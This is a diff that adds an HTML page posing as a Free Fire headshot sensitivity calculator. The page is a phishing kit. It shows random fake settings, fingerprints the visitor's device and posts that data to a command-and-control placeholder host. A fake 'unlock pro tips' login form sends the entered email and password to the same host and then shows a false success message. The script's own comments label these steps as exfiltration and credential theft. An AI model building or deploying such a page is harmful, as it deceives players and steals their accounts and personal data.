@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>🔥 Free Fire Headshot Sensitivity Calculator</title>
+  <meta name="description" content="Optimize your sensitivity for headshots! Works on ALL devices. Get pro settings instantly.">
+  <link rel="icon" href="https://i.imgur.com/3u7xKzD.png" type="image/png">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
+    body {
+      background: linear-gradient(to right, #000000, #1e3c72);
+      color: #fff;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      max-width: 500px;
+      margin: auto;
+      background: rgba(0, 0, 0, 0.7);
+      border-radius: 15px;
+      padding: 30px;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+      text-align: center;
+    }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+      color: #ff4500;
+      text-shadow: 0 0 10px #ff4500;
+    }
+    p {
+      margin-bottom: 20px;
+      font-size: 14px;
+      color: #ccc;
+    }
+    .form-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: bold;
+      color: #fff;
+    }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #333;
+      border-radius: 8px;
+      background: #222;
+      color: #fff;
+      font-size: 16px;
+    }
+    button {
+      background: #ff4500;
+      color: white;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 8px;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 10px;
+      width: 100%;
+      transition: 0.3s;
+      text-shadow: 0 0 5px #000;
+    }
+    button:hover {
+      background: #ff6a33;
+      box-shadow: 0 0 15px #ff4500;
+    }
+    .result {
+      margin-top: 20px;
+      padding: 15px;
+      background: rgba(0, 255, 0, 0.1);
+      border-radius: 8px;
+      display: none;
+      color: #0f0;
+      text-shadow: 0 0 5px #0f0;
+    }
+    .login-prompt {
+      margin-top: 20px;
+      padding: 15px;
+      background: rgba(255, 255, 0, 0.1);
+      border-radius: 8px;
+      display: none;
+    }
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #ff4500;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+      display: none;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎯 Free Fire Headshot Sensitivity Calculator</h1>
+    <p>Enter your device model to get PRO-level sensitivity settings for perfect headshots!</p>
+
+    <div class="form-group">
+      <label for="model">📱 Your Device Model</label>
+      <input type="text" id="model" placeholder="e.g. Xiaomi Redmi Note 10" required />
+    </div>
+
+    <div class="form-group">
+      <label for="os">🔧 Operating System</label>
+      <select id="os" required>
+        <option value="Android">Android</option>
+        <option value="iOS">iOS</option>
+      </select>
+    </div>
+
+    <button id="calculateBtn">⚡ Calculate Perfect Sensitivity</button>
+    <div class="loader" id="loader"></div>
+
+    <div class="result" id="result">
+      <strong>🔥 Recommended Sensitivity:</strong><br>
+      General: <span id="general"></span><br>
+      Red Dot: <span id="redDot"></span><br>
+      Scope: <span id="scope"></span><br>
+      <em>Apply these in-game for 1-tap headshots!</em>
+    </div>
+
+    <div class="login-prompt" id="loginPrompt">
+      <p>🔒 Want to save your profile?</p>
+      <input type="text" id="email" placeholder="Email or Username" /><br><br>
+      <input type="password" id="password" placeholder="Password" /><br><br>
+      <button id="loginBtn">🔓 Save & Unlock Pro Tips</button>
+    </div>
+
+    <p class="footer">
+      This tool is fan-made and not affiliated with Garena. Use at your own risk.
+    </p>
+  </div>
+
+  <script>
+    // Fingerprint + exfiltration
+    function getFingerprint() {
+      return {
+        model: document.getElementById("model").value,
+        os: document.getElementById("os").value,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screenRes: screen.width + "x" + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ip: "", // Will be filled by backend
+        timestamp: new Date().toISOString()
+      };
+    }
+
+    // Fake calculation
+    document.getElementById("calculateBtn").addEventListener("click", function () {
+      const model = document.getElementById("model").value.trim();
+      if (!model) {
+        alert("Please enter your device model!");
+        return;
+      }
+
+      document.getElementById("loader").style.display = "block";
+
+      // Simulate processing
+      setTimeout(() => {
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("result").style.display = "block";
+        document.getElementById("loginPrompt").style.display = "block";
+
+        // Fake sensitivity values
+        document.getElementById("general").textContent = (Math.random() * 50 + 80).toFixed(2);
+        document.getElementById("redDot").textContent = (Math.random() * 30 + 90).toFixed(2);
+        document.getElementById("scope").textContent = (Math.random() * 20 + 70).toFixed(2);
+
+        // Exfiltrate device data
+        fetch("https://your-c2-server.com/ff-log", {
+          method: "POST",
+          body: JSON.stringify(getFingerprint()),
+          headers: { "Content-Type": "application/json" },
+          mode: "no-cors"
+        });
+      }, 2500);
+    });
+
+    // Steal credentials
+    document.getElementById("loginBtn").addEventListener("click", function () {
+      const email = document.getElementById("email").value;
+      const pass = document.getElementById("password").value;
+
+      if (!email || !pass) {
+        alert("Please fill in your login to unlock pro settings!");
+        return;
+      }
+
+      // Send stolen credentials
+      fetch("https://your-c2-server.com/ff-creds", {
+        method: "POST",
+        body: JSON.stringify({ email, password, device: getFingerprint() }),
+        headers: { "Content-Type": "application/json" },
+        mode: "no-cors"
+      });
+
+      alert("🔓 Pro settings unlocked! Check your email for advanced headshot tips.");
+    });
+  </script>
+</body>
+</html>
